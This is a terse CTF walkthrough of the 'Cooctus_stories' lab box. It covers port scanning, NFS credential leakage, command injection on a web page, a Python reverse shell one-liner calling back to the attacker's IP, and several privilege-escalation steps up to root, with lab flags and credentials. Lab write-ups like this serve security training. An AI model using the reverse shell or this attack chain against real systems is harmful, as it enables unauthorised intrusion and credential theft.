# Cooctus_stories 

> VOiD | Tuesday 26 October 2021 06:25:12 PM IST

My IP :	10.8.253.221 
Target IP : 10.10.48.138


PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack
111/tcp   open  rpcbind    syn-ack
2049/tcp  open  nfs        syn-ack
8080/tcp  open  http-proxy syn-ack
34083/tcp open  unknown    syn-ack
35039/tcp open  unknown    syn-ack
42801/tcp open  unknown    syn-ack
54395/tcp open  unknown    syn-ack


## PORT 8080 [Werkzeug/0.14.1 Python/3.6.9]
/login
```bash
Creds
paradoxial.test:ShibaPretzel79

http://10.10.48.138:8080/cat
it executes commands

export RHOST="10.8.253.221";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

```


## PORT 2049
```bash
showmount -e 10.10.48.138                
Export list for 10.10.48.138:
/var/nfs/general *

mkdir /var/nfs/general -p
sudo mount  10.10.48.138:/var/nfs/general var/nfs/general

cat credentials.bak 
paradoxial.test
ShibaPretzel79

```

## USER[paradox@cchq]
```bash
cat user.txt 
THM{2dccd1ab3e03990aea77359831c85ca2}

cat note_to_para 
Paradox,

I'm testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.

- Szymex

```

SniffingCat.py
```py
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc


x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = "Approximate location of an upcoming Dr.Pepper shipment found:"
coords = "Coordinates: X: {x}, Y: {y}, Z: {z}".format(x=x, y=y, z=z)

with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip("\n")
    enc_pw = encode(line)
    if enc_pw == "pureelpbxr":
        os.system("wall -g paradox " + message)
        os.system("wall -g paradox " + coords)

```
```bash
python3 SniffingCat_decoder.py                                               2 ⨯
cherrycoke
su Szymex
cherrycoke
```

## USER[Szymex]
```bash
cat user.txt 
THM{c89f9f4ef264e22001f9a9c3d72992ef}

szymex@cchq:/home/tux/tuxling_1$ cat note 
Noot noot! You found me. 
I'm Mr. Skipper and this is my challenge for you.

General Tux has bestowed the first fragment of his secret key to me.
If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.

Good luck and keep on nooting!

PS: You can compile the source code with gcc

```

nootcode.c
```c
#include <stdio.h>

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT "f96"
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT "NOOT!\n"
#define nooOT "050a"
#define noOT printf
#define nOOT 0
#define nOoOoT "What does the penguin say?\n"
#define nout "d61"

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt

```
```bash
gcc nootcode_decoded.c ; ./a.out

What does the penguin say?
NOOT!
f96050ad61

szymex@cchq:/home/tux/tuxling_3$ cat note 
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: 637b56db1552

Combine them all and visit the station. 



find / -type d -name tuxling_2 2>/dev/null
/media/tuxling_2

szymex@cchq:/media/tuxling_2$ cat note 
Noot noot! You found me. 
I'm Rico and this is my challenge for you.

General Tux handed me a fragment of his secret key for safekeeping.
I've encrypted it with Penguin Grade Protection (PGP).

You can have the key fragment if you can decrypt it.

Good luck and keep on nooting!

gpg --import private.key
gpg -d fragment.asc 
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"
The second key fragment is: 6eaf62818d

```

```bash
full secret is
f96050ad616eaf62818d637b56db1552
tuxykitty
```

## USER[tux]
```bash
cat user.txt
THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}

sudo -l
User tux may run the following commands on cchq:
    (varg) NOPASSWD: /home/varg/CooctOS.py


-for i in range(0,2):
-    if pw != "slowroastpork":
-        pw = input("Password: ")
-    else:
-        if uname == "varg":

sudo -u varg /home/varg/CooctOS.py
varg:slowroastporks

```

## USER[varg]
```bash
sudo -l
User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount

cat user.txt
THM{3a33063a4a8a5805d17aa411a53286e6}

cat .ssh/id_rsa

sudo -u root /bin/umount

first do mount see there is /opt/CooctOS
unmount it there is root copy the id_rsa
root@cchq:~# cat root.txt 
THM{H4CK3D_BY_C00CTUS_CL4N}

```